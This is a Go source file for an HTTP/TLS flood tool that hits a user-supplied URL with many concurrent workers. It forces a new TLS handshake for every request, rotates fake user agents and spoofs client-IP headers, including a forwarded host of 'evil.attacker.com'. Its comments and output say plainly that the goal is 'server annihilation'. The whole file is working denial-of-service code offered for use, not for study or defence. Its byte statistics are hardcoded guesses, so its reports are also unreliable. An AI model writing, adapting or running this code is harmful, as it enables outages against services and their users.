package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type FloodConfig struct {
	URL         string
	Workers     int
	Duration    int
	RateLimit   int
	KeepAlive   bool
	RandomDelay bool
	Verbose     bool
}

type Stats struct {
	TotalRequests   int64
	SuccessRequests int64
	FailedRequests  int64
	BytesReceived   int64
}

// Advanced User Agent Generator
type UserAgentGenerator struct {
	browsers []string
	versions []string
	systems  []string
	engines  []string
}

func NewUserAgentGenerator() *UserAgentGenerator {
	return &UserAgentGenerator{
		browsers: []string{
			"Chrome", "Firefox", "Safari", "Edge", "Opera", "Brave", "Vivaldi",
			"Chromium", "Internet Explorer", "UC Browser", "Samsung Internet",
		},
		versions: []string{
			"120.0.0.0", "119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0",
			"115.0.0.0", "114.0.0.0", "113.0.0.0", "112.0.0.0", "111.0.0.0",
			"110.0.0.0", "109.0.0.0", "108.0.0.0", "107.0.0.0", "106.0.0.0",
		},
		systems: []string{
			"Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64",
			"Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 11_6_0",
			"X11; Linux x86_64", "X11; Ubuntu; Linux x86_64", "X11; Linux i686",
			"iPhone; CPU iPhone OS 17_0 like Mac OS X", "iPad; CPU OS 17_0 like Mac OS X",
			"Android 13; Mobile", "Android 12; Mobile", "Android 11; Mobile",
		},
		engines: []string{
			"AppleWebKit/537.36", "Gecko/20100101", "WebKit/605.1.15",
			"Trident/7.0", "Presto/2.12.388",
		},
	}
}

func (uag *UserAgentGenerator) Generate() string {
	browser := uag.browsers[rand.Intn(len(uag.browsers))]
	version := uag.versions[rand.Intn(len(uag.versions))]
	system := uag.systems[rand.Intn(len(uag.systems))]
	engine := uag.engines[rand.Intn(len(uag.engines))]

	patterns := []string{
		fmt.Sprintf("Mozilla/5.0 (%s) %s (KHTML, like Gecko) %s/%s Safari/537.36", system, engine, browser, version),
		fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 %s/%s", system, version, browser, version),
		fmt.Sprintf("Mozilla/5.0 (%s) %s Version/%s Safari/605.1.15", system, engine, version),
		fmt.Sprintf("Mozilla/5.0 (%s) %s %s/%s", system, engine, browser, version),
	}

	return patterns[rand.Intn(len(patterns))]
}

// ULTRA-EXPENSIVE DIAMOND-LEVEL TLS CLIENT (SERVER ANNIHILATION)
func createAdvancedClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false, // Force FULL certificate validation + OCSP + CRL checks
			MinVersion:         tls.VersionTLS10, // Force expensive version negotiation
			MaxVersion:         tls.VersionTLS13, // Maximum negotiation overhead
			PreferServerCipherSuites: false, // Force client preference (more work)
			
			// ULTRA-EXPENSIVE cipher suites (DIAMOND LEVEL)
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,     // MAXIMUM CPU destruction
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,   // ECDSA = ultra expensive
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,      // ChaCha20 = CPU killer
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,    // ECDSA + ChaCha20 = DEATH
				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,           // RSA key exchange hell
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,     // More ECDHE pain
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,   // ECDSA torture
			},
			
			// ULTRA-EXPENSIVE handshake settings
			SessionTicketsDisabled: true, // NO session reuse = FULL handshake EVERY TIME
			ClientSessionCache:     nil,  // NO caching = maximum server work
			Renegotiation:         tls.RenegotiateFreelyAsClient, // Allow re-negotiation hell
			
			// Force expensive curves
			CurvePreferences: []tls.CurveID{
				tls.CurveP521, // MOST expensive curve
				tls.CurveP384, // Very expensive
				tls.CurveP256, // Expensive
			},
			
			// Force expensive signature processing (Go version compatible)
			NextProtos: []string{"h2", "http/1.1"}, // Force protocol negotiation overhead
		},
		
		// ULTRA-EXPENSIVE connection settings
		Dial: (&net.Dialer{
			Timeout:   30 * time.Second, // Long timeout = more server resource holding
			KeepAlive: 0,                // NO keep-alive = new handshake EVERY TIME
		}).Dial,
		
		TLSHandshakeTimeout:   30 * time.Second, // LONG handshake = server resource lock
		ResponseHeaderTimeout: 30 * time.Second, // Hold server resources longer
		ExpectContinueTimeout: 10 * time.Second, // More server waiting
		
		// FORCE new connections (NO reuse = MAXIMUM TLS overhead)
		MaxIdleConns:        0, // NO connection pooling
		MaxIdleConnsPerHost: 0, // NO host pooling  
		MaxConnsPerHost:     0, // UNLIMITED new connections
		IdleConnTimeout:     0, // IMMEDIATE closure
		
		DisableCompression: false, // Force compression negotiation overhead
		DisableKeepAlives:  true,  // FORCE new connections
		
		// EXPENSIVE HTTP/2 settings for more server work
		ForceAttemptHTTP2:     true,
		MaxResponseHeaderBytes: 1024 * 1024, // Large headers = more processing
	}

	return &http.Client{
		Transport: tr,
		Timeout:   60 * time.Second, // LONG timeout = server resource holding
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // NO redirects = immediate server processing
		},
	}
}

// ULTRA-EXPENSIVE DIAMOND REQUEST (SERVER PROCESSING HELL)
func createAdvancedRequest(url string, uag *UserAgentGenerator) (*http.Request, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// ULTRA-EXPENSIVE headers that force MAXIMUM server processing
	req.Header.Set("User-Agent", uag.Generate())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,zh-CN,zh;q=0.8,ja;q=0.7,ko;q=0.6,fr;q=0.5,de;q=0.4,es;q=0.3,it;q=0.2,pt;q=0.1")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, compress, identity")
	req.Header.Set("Connection", "close") // FORCE new TLS handshake
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Expires", "0")
	
	// EXPENSIVE processing headers (force server to work harder)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	req.Header.Set("X-Originating-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	req.Header.Set("X-Cluster-Client-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	req.Header.Set("X-Forwarded-Host", "evil.attacker.com")
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Frame-Options", "DENY")
	req.Header.Set("X-Content-Type-Options", "nosniff")
	req.Header.Set("Referrer-Policy", "strict-origin-when-cross-origin")
	req.Header.Set("Feature-Policy", "geolocation 'none'; microphone 'none'; camera 'none'")
	req.Header.Set("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
	
	// FORCE expensive content negotiation
	req.Header.Set("Accept-Charset", "utf-8, iso-8859-1;q=0.5, windows-1252;q=0.3")
	req.Header.Set("Accept-Datetime", "Thu, 31 May 2007 20:35:00 GMT")
	req.Header.Set("If-Modified-Since", "Wed, 21 Oct 2015 07:28:00 GMT")
	req.Header.Set("If-None-Match", "\"737060cd8c284d8af7ad3082f209582d\"")
	req.Header.Set("Range", "bytes=0-1023")
	
	// ULTRA-EXPENSIVE custom headers (force server parsing)
	req.Header.Set("X-Custom-Auth-Token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ")
	req.Header.Set("X-API-Version", "v2.1.0")
	req.Header.Set("X-Client-Version", "1.0.0")
	req.Header.Set("X-Request-ID", fmt.Sprintf("req_%d_%d", rand.Int63(), rand.Int63()))
	req.Header.Set("X-Correlation-ID", fmt.Sprintf("corr_%d_%d", rand.Int63(), rand.Int63()))
	req.Header.Set("X-Session-ID", fmt.Sprintf("sess_%d_%d", rand.Int63(), rand.Int63()))
	req.Header.Set("X-Device-ID", fmt.Sprintf("dev_%d_%d", rand.Int63(), rand.Int63()))
	req.Header.Set("X-App-Platform", "web")
	req.Header.Set("X-App-Version", "2.1.0")
	req.Header.Set("X-Browser-Version", "Chrome/91.0.4472.124")
	req.Header.Set("X-Screen-Resolution", "1920x1080")
	req.Header.Set("X-Color-Depth", "24")
	req.Header.Set("X-Timezone", "UTC-8")
	req.Header.Set("X-Language", "en-US")
	req.Header.Set("X-Country", "US")
	req.Header.Set("X-Region", "CA")
	req.Header.Set("X-City", "San Francisco")
	
	return req, nil
}

// ULTRA-EXPENSIVE DIAMOND WORKER (COMPLETE SERVER ANNIHILATION)
func worker(config *FloodConfig, stats *Stats, uag *UserAgentGenerator, stopChan chan bool, wg *sync.WaitGroup) {
	defer wg.Done()

	// MULTIPLE clients for MAXIMUM TLS destruction
	var clients []*http.Client
	
	// DIAMOND-LEVEL request pool (ULTRA-EXPENSIVE)
	requestPool := make([]*http.Request, 3) // Smaller pool = more regeneration = more CPU
	for i := 0; i < 3; i++ {
		req, err := createAdvancedRequest(config.URL, uag)
		if err != nil {
			continue
		}
		requestPool[i] = req
	}
	reqIndex := 0
	
	// ULTRA-EXPENSIVE handshake flood with MAXIMUM concurrency
	semaphore := make(chan struct{}, 50) // MASSIVE concurrent handshakes
	
	for {
		select {
		case <-stopChan:
			return
		case semaphore <- struct{}{}:
			// Create MULTIPLE new clients for MAXIMUM TLS overhead
			clients = make([]*http.Client, 3) // 3 clients per request = 3x TLS overhead
			for i := 0; i < 3; i++ {
				clients[i] = createAdvancedClient()
			}
			
			// Use pre-generated request from pool
			req := requestPool[reqIndex]
			reqIndex = (reqIndex + 1) % 3
			
			// SPAWN MULTIPLE GOROUTINES for MAXIMUM DESTRUCTION
			for _, client := range clients {
				go func(c *http.Client, request *http.Request) {
					defer func() { <-semaphore }()
					
					// EXPENSIVE random delay (force server resource holding)
					if config.RandomDelay {
						time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond) // Longer delays
					}
					
					// PRE-HANDSHAKE: Force expensive DNS lookups
					time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
					
					// DIAMOND-LEVEL TLS handshake (MAXIMUM server CPU destruction)
					resp, err := c.Do(request)
					atomic.AddInt64(&stats.TotalRequests, 1)

					if err != nil {
						atomic.AddInt64(&stats.FailedRequests, 1)
						// FAILED handshakes still consume MASSIVE server resources
						atomic.AddInt64(&stats.BytesReceived, 8000) // ULTRA-EXPENSIVE TLS overhead
						
						// ADDITIONAL server punishment - try to establish connection again
						time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
						c.CloseIdleConnections()
						return
					}

					if resp.StatusCode >= 200 && resp.StatusCode < 400 {
						atomic.AddInt64(&stats.SuccessRequests, 1)
						atomic.AddInt64(&stats.BytesReceived, 15000) // MASSIVE TLS + HTTP + processing overhead
						
						// FORCE server to process response headers
						for key, values := range resp.Header {
							_ = key
							for _, value := range values {
								_ = value // Force processing
							}
						}
					} else {
						atomic.AddInt64(&stats.FailedRequests, 1)
						atomic.AddInt64(&stats.BytesReceived, 10000) // EXPENSIVE TLS + error processing
					}

					// SLOW response body processing (hold server resources longer)
					if resp.Body != nil {
						time.Sleep(time.Duration(rand.Intn(200)) * time.Millisecond)
						resp.Body.Close()
					}
					
					// POST-REQUEST: Force expensive connection cleanup
					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
					c.CloseIdleConnections()
					
					// FORCE server timeout processing
					time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
				}(client, req)
			}
		}
	}
}

// Ultra-fast horizontal status monitor
func statsMonitor(stats *Stats, stopChan chan bool, startTime time.Time) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	var lastTotal int64 = 0

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			total := atomic.LoadInt64(&stats.TotalRequests)
			success := atomic.LoadInt64(&stats.SuccessRequests)
			failed := atomic.LoadInt64(&stats.FailedRequests)
			bytes := atomic.LoadInt64(&stats.BytesReceived)
			
			currentRPS := total - lastTotal
			lastTotal = total
			
			elapsed := time.Since(startTime).Seconds()
			avgRPS := float64(total) / elapsed
			successRate := float64(success) / float64(total) * 100
			if total == 0 {
				successRate = 0
			}

			// Clear line and print horizontal status
			fmt.Printf("\r\033[K Req: %d |  Success: %d (%.1f%%) |  Failed: %d |  RPS: %d |  Avg: %.0f | 💾 MB: %.1f | ⏱️ %ds   ", 
				total, success, successRate, failed, currentRPS, avgRPS, float64(bytes)/1024/1024, int(elapsed))
		}
	}
}

func main() {
	var config FloodConfig

	flag.StringVar(&config.URL, "url", "", "Target URL (required)")
	flag.IntVar(&config.Workers, "workers", runtime.NumCPU()*6, "Number of concurrent workers (DIAMOND DESTRUCTION MODE)")
	flag.IntVar(&config.Duration, "duration", 60, "Attack duration in seconds")
	flag.IntVar(&config.RateLimit, "rate", 0, "Unused (ULTRA-EXPENSIVE TLS ANNIHILATION)")
	flag.BoolVar(&config.KeepAlive, "keepalive", false, "Use HTTP keep-alive (DISABLED for maximum TLS overhead)")
	flag.BoolVar(&config.RandomDelay, "random-delay", true, "Add expensive random delays (MAXIMUM server resource holding)")
	flag.BoolVar(&config.Verbose, "verbose", false, "Verbose output")
	flag.Parse()

	if config.URL == "" {
		log.Fatal("URL is required. Use -url flag")
	}

	if !strings.HasPrefix(config.URL, "http://") && !strings.HasPrefix(config.URL, "https://") {
		config.URL = "https://" + config.URL
	}

	// ULTRA-EXPENSIVE DIAMOND optimization for COMPLETE server annihilation
	runtime.GOMAXPROCS(runtime.NumCPU() * 4) // MAXIMUM CPU utilization
	runtime.GC()

	fmt.Printf("💎 DIAMOND TLS DESTRUCTION 💎\n")
	fmt.Printf("🎯 Target: %s | 👥 Workers: %d | ⏱️ Duration: %ds\n", config.URL, config.Workers, config.Duration)
	fmt.Printf("🔥💀 ULTRA-EXPENSIVE DIAMOND MODE - COMPLETE SERVER ANNIHILATION! 💀🔥\n\n")

	stats := &Stats{}
	uag := NewUserAgentGenerator()
	stopChan := make(chan bool, config.Workers+10)
	var wg sync.WaitGroup
	startTime := time.Now()

	// Start ultra-fast horizontal status monitor
	go statsMonitor(stats, stopChan, startTime)

	// Start workers
	for i := 0; i < config.Workers; i++ {
		wg.Add(1)
		go worker(&config, stats, uag, stopChan, &wg)
	}

	// Run for specified duration
	time.Sleep(time.Duration(config.Duration) * time.Second)

	// Stop all workers
	close(stopChan)
	wg.Wait()

	// Final statistics
	total := atomic.LoadInt64(&stats.TotalRequests)
	success := atomic.LoadInt64(&stats.SuccessRequests)
	bytes := atomic.LoadInt64(&stats.BytesReceived)
	elapsed := time.Since(startTime).Seconds()

	fmt.Printf("\n\n💥 LIGHTNING ATTACK COMPLETE! 💥\n")
	fmt.Printf(" %d reqs | %.1f%% success |  %.0f avg RPS |  %.1f MB |  %.1fs\n", 
		total, float64(success)/float64(total)*100, float64(total)/elapsed, float64(bytes)/1024/1024, elapsed)
}

